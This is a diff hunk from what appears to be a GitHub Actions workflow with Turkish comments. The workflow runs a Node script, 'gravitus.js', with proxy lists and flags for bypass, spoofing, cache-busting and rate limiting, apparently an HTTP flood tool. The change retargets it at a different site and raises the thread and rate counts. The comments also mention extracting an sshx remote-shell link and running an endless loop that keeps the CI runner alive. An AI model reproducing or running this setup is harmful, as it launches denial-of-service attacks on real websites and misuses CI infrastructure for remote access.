@@ -23,7 +23,7 @@ jobs:
           # 3. Log dosyasından sshx linkini ayıklıyoruz
           sudo python3 install.py  
           
-          node gravitus.js https://www.turkhackteam.org/ 60000 16 32 proxy.txt --bfm --spoof --cache --ratelimit
+          node gravitus.js https://dstat.returnstress.st/ 60000 32 64 proxy.txt --bfm --spoof --cache --ratelimit
                
           # 5. Kapanmayı önlemek için her 5 dakikada bir çıktı veren sonsuz döngü
           echo "Sonsuz döngü başlatılıyor..."
